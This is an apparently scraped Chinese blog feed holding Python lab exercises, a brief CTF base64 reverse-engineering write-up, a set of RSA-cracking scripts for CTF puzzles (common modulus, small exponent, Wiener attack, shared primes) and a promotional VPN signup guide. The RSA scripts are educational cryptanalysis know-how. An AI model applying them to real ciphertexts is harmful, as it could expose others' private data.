perimeter, areadef main():    parser = argparse.ArgumentParser(description=&quot;计算正方形的周长和面积。&quot;)    parser.add_argument(&quot;--sidelength&quot;, type=int, default=10, help=&quot;正方形边长&quot;)    args = parser.parse_args()    side_length = args.sidelength    perimeter, area = calculate_square_properties(side_length)    print(f&quot;周长=&#123;perimeter&#125;, 面积=&#123;area&#125;&quot;)if __name__ == &quot;__main__&quot;:    main()\n\n读取文本文件import argparsedef main():    parser = argparse.ArgumentParser(description=&quot;读取文件的相对路径&quot;)    parser.add_argument(&quot;path&quot;, type=str, help=&quot;相对文件路径&quot;)    args = parser.parse_args()    path = args.path    try:        with open(path, &quot;r&quot;, encoding=&quot;utf-8&quot;) as file:            lines = file.readlines()            for idx, line in enumerate(lines, start=1):                print(f&quot;&#123;idx&#125;: &#123;line.strip()&#125;&quot;)    except FileNotFoundError:        print(f&quot;文件 &#123;path&#125; 未找到&quot;)    except Exception as e:        print(f&quot;读取文件时发生错误: &#123;e&#125;&quot;)if __name__ == &quot;__main__&quot;:    main()\n\n输入并格式化保存 logsimport argparse# 阶乘def factorial(n):    if n == 0:        return 1    else:        return n * factorial(n - 1)def main():    parser = argparse.ArgumentParser(description=&quot;n的值&quot;)    parser.add_argument(&quot;n&quot;, type=int, help=&quot;n的值&quot;)    args = parser.parse_args()    n = args.n    for i in range(n + 1):        try:            with open(f&quot;out.logs&quot;, &quot;a&quot;, encoding=&quot;utf-8&quot;) as file:                file.write(f&quot;&#123;i&#125; &#123;i*2&#125; &#123;factorial(i)&#125;\\n&quot;)        except Exception as e:            print(f&quot;写入0-n时发生错误: &#123;e&#125;&quot;)if __name__ == &quot;__main__&quot;:    main()\n\n创建文本文件写入读取def read_file():    with open(&quot;shige.txt&quot;, &quot;r&quot;, encoding=&quot;utf-8&quot;) as file:        lines = file.readlines()        for line in lines:            print(line.strip())def write_file():    with open(&quot;shige.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as file:        file.write(&quot;春晓\\n春眠不觉晓，\\n处处闻啼鸟。\\n夜来风雨声，\\n花落知多少。\\n&quot;)if __name__ == &quot;__main__&quot;:    write_file()    read_file()\n\ncsv 文件读取和写入import pandas as pdheaders = [&quot;学号&quot;, &quot;姓名&quot;, &quot;年龄&quot;, &quot;专业&quot;, &quot;入学成绩&quot;]rows = [    (&quot;1001&quot;, &quot;张三&quot;, 19, &quot;物理学&quot;, 550),    (&quot;1002&quot;, &quot;李四&quot;, 18, &quot;电子工程&quot;, 530),    (&quot;1005&quot;, &quot;王五&quot;, 19, &quot;生物工程&quot;, 540),    (&quot;1006&quot;, &quot;赵四&quot;, 19, &quot;软件工程&quot;, 530),]# 将数据写入CSV文件df = pd.DataFrame(rows, columns=headers)df.to_csv(&quot;data.csv&quot;, index=False, encoding=&quot;utf-8&quot;)# 读取CSV文件df_read = pd.read_csv(&quot;data.csv&quot;, encoding=&quot;utf-8&quot;)print(df_read)\n\n实验 6 异常处理异常处理try:    a = 10    b = 5    c = a / b    if a &gt; b:        raise ValueError(&quot;a的值大于b.不符合要求&quot;)except IndexError:    print(&quot;索引错误&quot;)except ValueError as ve:    print(f&quot;数值错误: &#123;ve&#125;&quot;)except ArithmeticError:    print(&quot;算术错误&quot;)except Exception as e:    print(f&quot;未知异常: &#123;e&#125;&quot;)\n\n实验 7 函数和函数式编程递归非递归求阶乘# 递归求阶乘def fact(n):    if n == 1:        return 1    else:        return n * fact(n - 1)# 非递归求阶乘def fact_iter(n):    result = 1    while n &gt; 1:        result *= n        n -= 1    return resultn = int(input(&quot;请输入一个整数：&quot;))print(&quot;递归求阶乘：&quot;, fact(n))print(&quot;非递归求阶乘：&quot;, fact_iter(n))\n\n斐波那契数列# 求斐波那契数列def fib(n):    if n == 0:        return 0    elif n == 1:        return 1    else:        return fib(n - 1) + fib(n - 2)# 输出前20，每行10个for i in range(1, 21):    print(fib(i), end=&quot;\\t&quot;)    if i % 10 == 0:        print()\n\n可变参数定义#  可变参数求任意个数的最小值def min_n(a, b, *c):    return min(a, b, *c)# 测试代码print(min_n(8, 2))print(min_n(16, 1, 7, 4, 15))\n\n元组def analyze_sequence(seq):    max_value = max(seq)    min_value = min(seq)    count = len(seq)    return max_value, min_value, count# 测试数据s1 = [9, 7, 8, 3, 2, 1, 55, 6]s2 = [&quot;apple&quot;, &quot;pear&quot;, &quot;melon&quot;, &quot;kiwi&quot;]s3 = &quot;TheQuickBrownFox&quot;# 运行测试result1 = analyze_sequence(s1)result2 = analyze_sequence(s2)result3 = analyze_sequence(s3)print(    f&quot;list1 = &#123;s1&#125;\\n最大值 = &#123;result1[0]&#125;, 最小值 = &#123;result1[1]&#125;, 元素个数 = &#123;result1[2]&#125;&quot;)print(    f&quot;list2 = &#123;s2&#125;\\n最大值 = &#123;result2[0]&#125;, 最小值 = &#123;result2[1]&#125;, 元素个数 = &#123;result2[2]&#125;&quot;)print(    f&quot;list3 = &#123;s3&#125;\\n最大值 = &#123;result3[0]&#125;, 最小值 = &#123;result3[1]&#125;, 元素个数 = &#123;result3[2]&#125;&quot;)\n\n实验 9 附加题奇偶判断def isOdd(num):    return num % 2 != 0# 示例使用num = int(input(&quot;请输入一个整数: &quot;))if isOdd(num):    print(f&quot;&#123;num&#125; 是 奇数&quot;)else:    print(f&quot;&#123;num&#125; 是 偶数&quot;)\n\n阶乘def factorial(n):    if n == 0:        return 1    result = 1    for i in range(1, n + 1):        result *= i    return resultdef main():    m = int(input(&quot;请输入一个整数(n&gt;=0): &quot;))    total_sum = 0    for i in range(m + 1):        fact = factorial(i)        print(f&quot;&#123;i&#125;的阶乘是&#123;fact&#125;&quot;)        total_sum += fact    print(f&quot;&lt;= &#123;m&#125;的所有数的阶乘之和为&#123;total_sum&#125;&quot;)main()\n\n找最小值def min_n(a, b, *c):    # 将所有参数放入一个列表    numbers = [a, b] + list(c)    # 找到最小值    min_value = min(numbers)    return min_value# 测试代码print(f&quot;8, 2中最小值为 &#123;min_n(8, 2)&#125;&quot;)print(f&quot;16, 1, 7, 4, 15中最小值为 &#123;min_n(16, 1, 7, 4, 15)&#125;&quot;)\n\n列表元组def analyze_sequence(seq):    max_value = max(seq)    min_value = min(seq)    length = len(seq)    return max_value, min_value, length# 测试数据s1 = [4, 3, 5, 76, 5, 2]s2 = [&quot;apple&quot;, &quot;pear&quot;, &quot;banana&quot;, &quot;kiwi&quot;]s3 = &quot;TheQuickBrownFox&quot;# 结果result1 = analyze_sequence(s1)result2 = analyze_sequence(s2)result3 = analyze_sequence(s3)print(    f&quot;list = &#123;s1&#125;\\n最大值= &#123;result1[0]&#125;，最小值= &#123;result1[1]&#125;，元素个数= &#123;result1[2]&#125;&quot;)print(    f&quot;list = &#123;s2&#125;\\n最大值= &#123;result2[0]&#125;，最小值= &#123;result2[1]&#125;，元素个数= &#123;result2[2]&#125;&quot;)print(    f&quot;list = &#123;s3&#125;\\n最大值= &#123;result3[0]&#125;，最小值= &#123;result3[1]&#125;，元素个数= &#123;result3[2]&#125;&quot;)\n\n字频def count_numbers(input_string):    # 将输入字符串转换为列表    numbers = list(map(int, input_string.split(&#x27;,&#x27;)))    # 创建一个字典来统计每个数字出现的次数    count_dict = &#123;&#125;    for number in numbers:        if number in count_dict:            count_dict[number] += 1        else:            count_dict[number] = 1    # 打印统计结果    print(&quot;统计结果为:&quot;)    for number, count in count_dict.items():        print(f&quot;&#123;number&#125; 出现 &#123;count&#125; 次&quot;)    # 找出出现次数最多的数字    max_count = max(count_dict.values())    most_frequent_numbers = [number for number, count in count_dict.items() if count == max_count]    # 打印出现次数最多的数字和次数    print(&quot;出现次数最多的数字和它出现的次数是:&quot;)    for number in most_frequent_numbers:        print(f&quot;&#123;number&#125; 出现 &#123;max_count&#125; 次&quot;)# 示例输入input_string = &quot;2,3,3,2,4,5,6,6,7,8&quot;count_numbers(input_string)\n\n找数def My_Search(lst, target):    left, right = 0, len(lst) - 1    while left &lt;= right:        mid = (left + right) // 2        if lst[mid] == target:            return mid        elif lst[mid] &lt; target:            left = mid + 1        else:            right = mid - 1    return &quot;未查找到该数&quot;# 示例用法lst1 = [12, 15, 33, 34, 35, 39, 42, 45, 45, 49]lst2 = [10, 11, 15, 23, 29, 31, 42, 46, 48, 49]print(My_Search(lst1, 33))  # 输出: 2print(My_Search(lst2, 33))  # 输出: 未查找到该数\n\n斐波那契def fib(n):    if n == 0:        return 0    elif n == 1:        return 1    else:        return fib(n - 1) + fib(n - 2)def print_fibonacci():    for i in range(20):        # 计算斐波那契数        num = fib(i)        # 打印，宽度为5，右对齐        print(f&quot;&#123;num:&gt;5&#125;&quot;, end=&quot; &quot;)        # 每10个数换行        if (i + 1) % 10 == 0:            print()print_fibonacci()\n\nreducefrom functools import reducedef fn(x, y):    return x * 10 + ya = [1, 3, 5, 7, 9]result = reduce(fn, a)print(result)  # 输出: 13579\n\n正负分离# 输入一组整数input_numbers = input(&quot;输入一组有正有负的整数，用逗号隔开:&quot;).split(&quot;,&quot;)# 将输入的字符串转换为整数numbers = list(map(int, input_numbers))# 使用 lambda 和 filter 过滤出大于零的元素positive_numbers = list(filter(lambda x: x &gt; 0, numbers))# 输出结果print(positive_numbers)\n\n实验 10pandas 实现 csv 的增删改查\nimport pandas as pdfrom tabulate import tabulate# 读取 CSV 文件df = pd.read_csv(&quot;pizza_sales.csv&quot;)# 查询数据：查询所有 pizza_name 为 &quot;Margherita&quot; 的订单margherita_orders = df[df[&quot;pizza_name&quot;] == &quot;Margherita&quot;]print(&quot;Margherita 订单:&quot;)print(tabulate(margherita_orders, headers=&quot;keys&quot;, tablefmt=&quot;pretty&quot;))# 添加数据：创建新订单数据new_order = &#123;    &quot;pizza_id&quot;: 101,    &quot;order_id&quot;: 202,    &quot;pizza_name_id&quot;: 303,    &quot;quantity&quot;: 2,    &quot;order_date&quot;: &quot;2023-10-01&quot;,    &quot;order_time&quot;: &quot;12:00&quot;,    &quot;unit_price&quot;: 15.0,    &quot;total_price&quot;: 30.0,    &quot;pizza_size&quot;: &quot;Medium&quot;,    &quot;pizza_category&quot;: &quot;Vegetarian&quot;,    &quot;pizza_ingredients&quot;: &quot;Tomato, Cheese, Basil&quot;,    &quot;pizza_name&quot;: &quot;Margherita&quot;,&#125;# 添加新订单df = pd.concat([df, pd.DataFrame([new_order])], ignore_index=True)print(&quot;\\n添加新订单后的数据:&quot;)print(tabulate(df, headers=&quot;keys&quot;, tablefmt=&quot;pretty&quot;))# 删除数据：删除 order_id 为 202 的订单df = df[df[&quot;order_id&quot;] != 202]print(&quot;\\n删除 order_id 为 202 的订单后的数据:&quot;)print(tabulate(df, headers=&quot;keys&quot;, tablefmt=&quot;pretty&quot;))# 更新数据：将 order_id 为 101 的订单的 quantity 更新为 3df.loc[df[&quot;order_id&quot;] == 101, &quot;quantity&quot;] = 3print(&quot;\\n更新 order_id 为 101 的订单的数量后的数据:&quot;)print(tabulate(df, headers=&quot;keys&quot;, tablefmt=&quot;pretty&quot;))# 保存修改后的数据到 CSV 文件df.to_csv(&quot;pizza_sales.csv&quot;, index=False)\n\n\n\n\n\n实验 11词频统计import jieba.posseg as psegimport pandas as pdfrom wordcloud import WordCloud# 读取txt全部文字fin = open(&quot;射雕英雄传.txt&quot;, encoding=&quot;utf-8&quot;)content = fin.read()# 使用jieba分词并进行词性标注words = pseg.cut(content)# 提取人名names = [word for word, flag in words if flag == &quot;nr&quot;]# 统计人名词频name_freq = pd.Series(names).value_counts()# 打印前10个高频人名print(name_freq.head(10))# 绘制云图wc = WordCloud(font_path=&quot;simhei.ttf&quot;, width=800, height=600, background_color=&quot;white&quot;)wc.generate_from_frequencies(name_freq)wc.to_file(&quot;name_cloud.png&quot;)\n\n\n兴趣推荐import pandas as pddf = pd.read_excel(&quot;./员工数据表.xlsx&quot;, engine=&quot;openpyxl&quot;)print(df.head())  # 打印前几行数据# 查询男女，只保留编号、姓名、性别、部门、爱好的5列df_boy = df.loc[df[&quot;性别&quot;] == &quot;男&quot;, [&quot;编号&quot;, &quot;姓名&quot;, &quot;性别&quot;, &quot;部门&quot;, &quot;爱好&quot;]]df_girl = df.loc[df[&quot;性别&quot;] == &quot;女&quot;, [&quot;编号&quot;, &quot;姓名&quot;, &quot;性别&quot;, &quot;部门&quot;, &quot;爱好&quot;]]print(df_boy.head(3))  # 打印男生数据的前3行print(df_girl.head(3))  # 打印女生数据的前3行df_merge = pd.merge(left=df_boy, right=df_girl, how=&quot;cross&quot;, suffixes=(&quot;_boy&quot;, &quot;_girl&quot;))print(df_merge.head())  # 打印合并后的数据前几行print(len(df_boy))  # 打印男生数据的长度print(len(df_girl))  # 打印女生数据的长度print(df_merge.shape)  # 打印合并数据的形状def compute_score(row):    # 使用交集和并集计算相似度    hobbies_boy = set(row[&quot;爱好_boy&quot;].split(&quot;|&quot;))    hobbies_girl = set(row[&quot;爱好_girl&quot;].split(&quot;|&quot;))    return len(hobbies_boy &amp; hobbies_girl) / len(hobbies_boy | hobbies_girl)df_merge[&quot;相似度&quot;] = df_merge.apply(compute_score, axis=1)print(df_merge.sample(6))  # 随机打印6行数据# 男编号查女性列表number = &quot;S00004&quot;print(    df_merge[df_merge[&quot;编号_boy&quot;] == number]    .sort_values(by=&quot;相似度&quot;, ascending=False)    .head(3))# 女编号查男性列表number = &quot;S00093&quot;print(    df_merge[df_merge[&quot;编号_girl&quot;] == number]    .sort_values(by=&quot;相似度&quot;, ascending=False)    .head(3))\n\n\n实验 12练习 1import numpy as np# 创建一个长度为10的一维全为0的ndarray对象，然后让第5个元素等于1a = np.array([0, 0, 0, 0, 1, 0, 0, 0, 0, 0])print(a)# 创建一个元素从10到49的ndarray对象b = np.array(range(10, 50))print(b)# 反转数组c = b[::-1]print(c)# 使用随机创建一个10*10的ndarray对象，并打印最大最小元素d = np.random.random((10, 10))print(d)print(d.max())print(d.min())# 创建一个10*10的ndarray对象，且矩阵边框为1，内部为0e = np.ones((10, 10))e[1:-1, 1:-1] = 0print(e)# 创建每一行都是从0到4的5*5的ndarray对象f = np.array([np.arange(5)] * 5)print(f)# 创建一个范围在(0,1)之间的长度为12的等差数列g = np.linspace(0, 1, 12)print(g)# 创建一个长度为10的随机数组并排序h = np.random.random(10)h.sort()print(h)# 创建一个长度为10的随机数组并将最大值替换为0i = np.random.randint(0, 10, 10)print(i)i[i.argmax()] = 0print(i)\n\n练习 2import numpy as npimport time# 给定一个4维矩阵，求最后两维的和def sum_last_two_dimensions(matrix):    return np.sum(matrix, axis=(-1, -2))# 给定一个数组12345，在每个元素之间插入三个0def insert_zeros(array):    return np.insert(array, np.arange(1, len(array)), 0)# 给定一个二维矩阵，交换其中两行元素def swap_rows(matrix, row1, row2):    matrix[[row1, row2]] = matrix[[row2, row1]]    return matrix# 创建一个100000长度的随机数组random_array = np.random.rand(100000)# 方法一：使用for循环对数组求三次方start_time = time.time()cubed_array_loop = np.array([x**3 for x in random_array])loop_time = time.time() - start_time# 方法二：使用numpy对数组求三次方start_time = time.time()cubed_array_numpy = np.power(random_array, 3)numpy_time = time.time() - start_time# 比较所用时间print(f&quot;使用for循环求三次方的时间: &#123;loop_time&#125;秒&quot;)print(f&quot;使用numpy求三次方的时间: &#123;numpy_time&#125;秒&quot;)# 创建一个5 * 3随机矩阵和一个3 * 2随机矩阵matrix_5x3 = np.random.rand(5, 3)matrix_3x2 = np.random.rand(3, 2)# 求矩阵积matrix_product = np.dot(matrix_5x3, matrix_3x2)print(&quot;5x3矩阵:&quot;)print(matrix_5x3)print(&quot;3x2矩阵:&quot;)print(matrix_3x2)print(&quot;矩阵积:&quot;)print(matrix_product)# 矩阵的每一行的元素都减去该行的平均值def subtract_row_mean(matrix):    row_means = matrix.mean(axis=1, keepdims=True)    return matrix - row_means# 打印出以下矩阵（要求使用np.zeros创建8*8的矩阵）def create_checkerboard():    checkerboard = np.zeros((8, 8), dtype=int)    checkerboard[1::2, ::2] = 1    checkerboard[::2, 1::2] = 1    return checkerboard# 正则化一个5*5随机矩阵def normalize_matrix(matrix):    min_val = matrix.min()    max_val = matrix.max()    return (matrix - min_val) / (max_val - min_val)matrix = np.random.randint(0, 100, (5, 5))normalized_matrix = normalize_matrix(matrix)print(&quot;原始矩阵:&quot;)print(matrix)print(&quot;正则化后的矩阵:&quot;)print(normalized_matrix)\n\n爬虫实验地址：爬虫实验\n专项知识点-正则表达式\n匹配 “abbbbbbbbbc” 中的 “abbbbbbbb”（从贪婪非贪婪角度分析）正则表达式可以通过贪婪和非贪婪方式进行匹配，分析如下：\n\n贪婪模式：使用 .*，匹配尽可能多的字符。\nimport retext = &quot;abbbbbbbbbc&quot;match = re.search(r&quot;ab.*c&quot;, text)print(match.group())  # 输出: abbbbbbbbbc\n\n非贪婪模式：使用 .*?，尽量匹配少的字符。\nimport retext = &quot;abbbbbbbbbc&quot;match = re.search(r&quot;ab.*?c&quot;, text)print(match.group())  # 输出: abbbbbbbb\n\n在贪婪模式下，.* 会尽量匹配多的字符，所以结果是 abbbbbbbbbc。而非贪婪模式下，.*? 会尽量匹配少的字符，所以结果是 abbbbbbbb。\n\n匹配以字母 “c” 开头的单词对于这个题目，正则表达式可以通过 \\bc\\w*\\b 来匹配以字母 “c” 开头的单词，其中 \\b 是单词边界，\\w* 匹配零个或多个字母、数字或下划线。\nimport recontent = &quot;The cat sat on the mat and the rat chased the cat&quot;matches = re.findall(r&#x27;\\bc\\w*\\b&#x27;, content)print(matches)  # 输出: [&#x27;cat&#x27;, &#x27;chased&#x27;, &#x27;cat&#x27;]\n\n从 HTML 中提取包含 class=&quot;active&quot; 的列表项中的歌手名和歌曲名使用 re.search 查找符合 class=&quot;active&quot; 的 li 元素，并提取出歌手名和歌曲名。正则表达式可以使用捕获组来提取歌手名和歌曲名。\nimport re html = &#x27;&#x27;&#x27;&lt;div id=&quot;songs-list&quot;&gt;&lt;h2 class =&quot;title&quot;&gt;经典老歌&lt;/h2&gt;&lt;p class=&quot;introduction&quot;&gt;经典老歌列表&lt;/p&gt;&lt;ul id=&quot;list&quot; class=&quot;list-group&quot;&gt;&lt;li data-view=&quot;2&quot;&gt;一路上有你&lt;/li&gt;&lt;li data-view=&quot;7&quot;&gt;&lt;a href =&quot;/2.mp3&quot; singer=&quot;任贤齐&quot;&gt;沧海一卢笑 &lt;/a&gt;&lt;/li&gt;&lt;li data-view=&quot;4&quot; class=&quot;active&quot;&gt;&lt;a href =&quot;/3.mp3&quot; singer=&quot;齐秦&quot;&gt;往事随风&lt;/a&gt;&lt;/li&gt;&lt;li data-view =&quot;6&quot;&gt;&lt;a href=&quot;/4.mp3&quot; singer=&quot;beyond&quot;&gt;光辉岁月 &lt;/a&gt;&lt;/li&gt;&lt;li data-view=&quot;5&quot;&gt;&lt;a href=&quot;/5.mp3&quot; singer=&quot;除慧琳&quot;&gt;记事本&lt;/a&gt;&lt;/li&gt;&lt;li data-view=&quot;5&quot;&gt;&lt;a href =&quot;/6.mp3&quot; singer=&quot;邓丽君&quot;&gt; 但愿人长久 &lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&#x27;&#x27;&#x27; # 使用正则表达式匹配 active 类的 &lt;li&gt; 中的歌手和歌曲名match = re.search(r&#x27;&lt;li[^&gt;]*class=&quot;active&quot;[^&gt;]*&gt;.*?&lt;a[^&gt;]*singer=&quot;([^&quot;]*)&quot;[^&gt;]*&gt;(.*?)&lt;/a&gt;&#x27;, html)if match:    singer = match.group(1)    song = match.group(2)    print(f&quot;歌手: &#123;singer&#125;, 歌曲: &#123;song&#125;&quot;)else:    print(&quot;未找到匹配项&quot;)\n\n输出:\n歌手: 齐秦, 歌曲: 往事随风\n\n分析：这个正则表达式的作用是：\n\nr&#39;&lt;li[^&gt;]*class=&quot;active&quot;[^&gt;]*&gt; 匹配包含 class=&quot;active&quot; 的 li 元素。\n.*?&lt;a[^&gt;]*singer=&quot;([^&quot;]*)&quot;[^&gt;]*&gt; 用来捕获 &lt;a&gt; 标签中的 singer 属性（即歌手名）。\n(.*?)&lt;/a&gt; 捕获 &lt;a&gt; 标签中的歌曲名。\n\n\n\n数据分析之matplotlib","categories":["Python"],"tags":["Python"]},{"title":"QFNUCTF（日照）-Reverse-writeup","url":"/posts/44b69183.html","content":"base64++查壳\n无壳\n反编译\n查看字串，有两个比较特殊的字符串\n联想到题目是换表base64\n\n解密滚去https://ctf.mzy0.com/CyberChef3/    解密一下\n\n题后工作解密出来后面带着LQB，一开始我以为我做错了，后来我把文件拉进kali运行了一下\n发现这个字符串flag&#123;6JOd5qGl5p2v5Yqg5rK5&#125;LQB是无法通过正常验证的\n而去掉LQB之后flag&#123;6JOd5qGl5p2v5Yqg5rK5&#125;是正常验证的\n所以我去掉之后提交，但还是没有通过\n\n无奈之下我放弃这个题了\n\n\n就在前几天我找到了出题人，问了问情况，发现程序里是有一段添加字符串LQB的代码的，所以输出结果带着LQB没错，我的做题思路也没错\n提交失败的原因是，后台正确的flag中的1和正确答案的l混了，我联系出题人修改了bug\n解题结束！\nXOR（修改）查壳等会吧，明天再写，累了\n","categories":["CTF","WP","QFNUCTF"],"tags":["CTF"]},{"title":"RSA的一些解密脚本","url":"/posts/10f5a405.html","content":"目录1.已知(p,q,e),求d\n2.已知(p,q,e,c)，求m\n3.已知(p,q,dp,dq,c)，求m\n4.已知(e,dp,n,c)，求m\n5.已知(n,e1,e2,c1,c2)，求m\n6.已知(e,n1,c1,n2,c2)，求m\n7.已知(p+q,p-q,e,c)，求m\n8.已知(e,n,c)，求m\n9.已知(e,n,c)，求m（e极小，如3，低加密指数攻击）\n10.已知(e,n,c)，求m（e很大，低解密指数攻击）\n11.已知(c,n,p(q-1),q(p-1))，求m\n参考：CTF中关于RSA的常见题型_abtgu的博客-CSDN博客_ctf rsa题目\n1、RSA算法需要的基础知识：\n\n（5）判断互质数：\t\n1）两个质数一定是互质数。\n2）一个质数如果不能整除另一个合数（合数是指在大于1的整数中除了能被1和本身整除外，还能被其他数（0除外）整除的数），这两个数为互质数。例如，3与10、5与 26。\n3）1不是质数也不是合数，它和任何一个自然数在一起都是互质数。\n4）相邻的两个自然数是互质数。如 15与16。\n5）相邻的两个奇数是互质数。如 49与 51。\n6）大数是质数的两个数是互质数。如97与88。\n7）小数是质数，大数不是小数的倍数的两个数是互质数。如 7和16。\n8）两个数都是合数（二数差又较大），小数所有的质因数，都不是大数的约数（因数），这两个数是互质数。如357与715，357&#x3D;3×7×17，而3、7和17都不是715的约数，这两个数为互质数。\n等等。。。\n（6）什么是模运算与模指数运算？\n模运算是整数运算，有一个整数m，以n为模做模运算，即m mod n。让m被n整除，只取所得的余数作为结果，就叫做模运算。例如，10 mod 3&#x3D;1；26 mod 6&#x3D;2；28 mod 2 &#x3D;0等等。\n模指数运算就是先做指数运算，取其结果再做模运算。如(5^3) mod 7 &#x3D; (125 mod 7) &#x3D; 6。\n2、RSA加解密\n（1）RSA加密算法由五个部分组成：\n原文(Message)、密文(Ciphertext)、公钥(Public Key)、私钥(Secret Key)、加密算法(Encryption)、解密算法(Decryption)。\n（2）RSA求公钥私钥步骤如下：\n1）随机选择两个不相同的素数 p,q 。\n2）将p,q相乘，记为 n &#x3D; p × q 。\n3）计算n的欧拉函数φ(n)，当p,q为不相同的素数时，φ(n)&#x3D;(p−1)(q−1)。\n4）随机选择一个整数e，满足两个条件：φ(n)与e互质，且 1 &lt; e &lt;φ(n)。\n5）计算e对于φ(n)的模反元素d，也就是说找到一个d满足ed &#x3D; 1modφ(n)。这个式子等价于ed &#x3D; kφ(n) + 1，实际上就是对于方程ed − kφ(n) &#x3D; 1求(d,k)的整数解。这个方程可以用扩展欧几里得算法求解。\n6）最终把(e,n)封装成公钥，(d,n)封装成私钥。\n（3）RSA加密与解密\n\n\n（4）RSA算法的破解\n1）由于公钥中n已知，只需计算出d，便可通过M&#x3D;Cd mod n计算出明文M。\n2）由于方程ed − kφ(n) &#x3D; 1，公钥中e已知，我们只需要知道φ(n)的值便可求出(d,k)的整数解。\n3）由于φ(n) &#x3D; （p - 1）(q - 1)，我们需要求出p，q的值。\n4）由于n &#x3D; p  q，我们需要对n做因数分解。\n只要n可以被因数分解为p，q，我们便可反推破解私钥，从而破解密文。\n\n1.已知(p,q,e),求dimport gmpy2p = q = e = phi = (p-1)(q-1)d = gmpy2.invert(e,phi)print(d)\n\n2.已知(p,q,e,c)，求m密文c，明文m\nimport gmpy2 import binascii c = e =  p = q =  # 计算私钥 dphi = (p-1)*(q-1)d = gmpy2.invert(e, phi) # 解密 mm = gmpy2.powmod(c,d,p*q)print(binascii.unhexlify(hex(m)[2:]))\n\n3.已知(p,q,dp,dq,c)，求m\nimport gmpy2import binasciip =q =dp =dq =c = I = gmpy2.invert(p,q)mp = gmpy2.powmod(c,dp,p)mq = gmpy2.powmod(c,dq,q) m = ((I*(mp-mq))%q)*p+mpprint(binascii.unhexlify(hex(m)[2:]))\n\n4.已知(e,dp,n,c)，求m\nimport gmpy2import binasciie = n =dp =c =for i in range(1,e):    if (e*dp-1)%i == 0 and n%((e*dp-1)//i+1)==0:        q = n//((e*dp-1)//i+1)        phi = (q-1)*((e*dp-1)//i)        d = gmpy2.invert(e,phi)        m = gmpy2.powmod(c,d,n) print(binascii.unhexlify(hex(m)[2:]))\n\n5.已知(n,e1,e2,c1,c2)，求m\nimport gmpy2import binascii n =c1 = c2 = e1 = e2 =  s = gmpy2.gcdext(e1,e2)a = s[1]b = s[2] if a&lt;0:    a = -a    c1 = gmpy2.invert(c1,n)else:    b = -b    c2 = gmpy2.invert(c2,n) m = (gmpy2.powmod(c1,a,n)*gmpy2.powmod(c2,b,n))%n print(binascii.unhexlify(hex(m)[2:]))\n\n6.已知(e,n1,c1,n2,c2)，求m解题思路： 两组数中e相同，n，c不同，求出n1与n2的最大公因数即为p，之后就可以得到q和d，从而求解m。\nimport gmpy2import binascii e = n1 = c1 = n2 = c2 =  p1 = gmpy2.gcd(n1,n2)q1 = n1 // p1phi1 = (p1-1)*(q1-1) d1 = gmpy2.invert(e,phi1)m1 = gmpy2.powmod(c1,d1,n1) print(binascii.unhexlify(hex(m1)[2:])) p2 = gmpy2.gcd(n2,n1)q2 = n2 // p2phi2 = (p2-1)*(q2-1) d2 = gmpy2.invert(e,phi2)m2 = gmpy2.powmod(c2,d2,n2) print(binascii.unhexlify(hex(m2)[2:]))\n\n7.已知(p+q,p-q,e,c)，求mimport gmpy2import binasciie=a=b=c= p = (a+b)//2q = (a-b)//2 phi = (p-1)*(q-1)d = gmpy2.invert(e,phi) m = gmpy2.powmod(c,d,p*q)print(binascii.unhexlify(hex(m)[2:])) \n\n8.已知(e,n,c)，求m解题思路：可以分解n得到p,q\n在线分解大整数网址:\nhttp://www.factordb.com/index.php\n分解质因数工具 - 整数分解最多为70位\n注意：在factordb中因为数过大而显示不全时，可以点击show查看完整数据，但是在复制数据时注意它的每一行都有空格，粘贴后要去掉\n\n\n若以上都不好用，则用yafu计算\nimport gmpy2import binascii e = n = c = p = q =  phi = (p-1)*(q-1)d = gmpy2.invert(e,phi)m = gmpy2.powmod(c,d,n) print(binascii.unhexlify(hex(m)[2:]))\t\n\n9.已知(e,n,c)，求m（e极小，如3，低加密指数攻击）\nimport gmpy2import binascii e =n =c = i = 0while True:    if gmpy2.iroot((c+i*n),3)[1] == True:        m = gmpy2.iroot((c+i*n),3)[0]        break    i += 1 print(binascii.unhexlify(hex(m)[2:]))\n\n10.已知(e,n,c)，求m（e很大，低解密指数攻击）解题思路： 题中e很大，故可知是低解密指数攻击。\n可以使用破解脚本：求出d的值，文件下载地址GitHub - pablocelayes&#x2F;rsa-wiener-attack: A Python implementation of the Wiener attack on RSA public-key encryption scheme.\n（注意，这里要将破解脚本和rsa-wiener-attack的py文件放在同一个目录下）\nimport gmpy2import binasciiimport RSAwienerHacker e =n =c = d = RSAwienerHacker.hack_RSA(e,n)m = gmpy2.powmod(c,d,n) print(binascii.unhexlify(hex(m)[2:])) \n\n11.已知（c,n,p（q-1）,q*（p-1）），求mimport gmpy2from Crypto.Util.number import *#pq = p*(q-1)#qp = q*(p-1)c= n= pq= qp=  e = 65537p = n - pqq = n - qpphi = (p - 1)*(q - 1) d = gmpy2.invert(e,phi)m = gmpy2.powmod(c,d,n)print(long_to_bytes(m)) \n\n","categories":["CTF","Crypto"],"tags":["CTF","Crypto"]},{"title":"Sakuracat注册使用教程","url":"/posts/80f8b1da.html","content":"Sakuracat注册使用教程爬墙工具的介绍和安装使用工具介绍 这些你都不需要记，看看就行 \n\n虚拟专用网络(Virtual Private Network，VPN)是专用网络的延伸，它包含了类似 Internet 的共享或公共网络链接。通过 VPN 可以以模拟点对点专用链接的方式通过共享或公共网络在两台计算机之间发送数据。\n\n如果说得再通俗一点，VPN 实际上是 “线路中的线路”，类型于城市大道上的 “公交专用线”，所不同的是，由 VPN 组成的 “线路” 并不是物理存在的，而是通过技术手段模拟出来，即是 “虚拟” 的。不过，这种虚拟的专用网络技术却可以在一条公用线路中为两台计算机建立一个逻辑上的专用 “通道”，它具有良好的保密和不受干扰性，使双方能进行自由而安全的点对点连接，因此被网络管理员们非常广泛地关注着。\n\n通过虚拟专用网，我们在家就可以轻松安全的登录到公司的内部网络上，这样可以实现我们在家办公的梦想了。\n\n\n账号注册 本人不对此工具处理任何售后，有使用问题请找他们官网售后 \n有了这个工具，你不只是能进 ai，还可以高速浏览 GitHub 等网站，以及…………\n点击下方任意链接跳转注册界面↓（有进不去的换一个）\n\n链接 1\n链接 2\n链接 3\n链接 4\n链接 5\n链接 6\n链接 7\n\n输入邮箱密码注册账号，注册完成后登陆\n\n然后点击左侧购买订阅\n\n根据需求选择你合适的方案，如果你只是想尝鲜的话，毫无疑问，选最便宜的，能用就行\n\n我本人用的是  38.8 巨量不限时，推荐这个 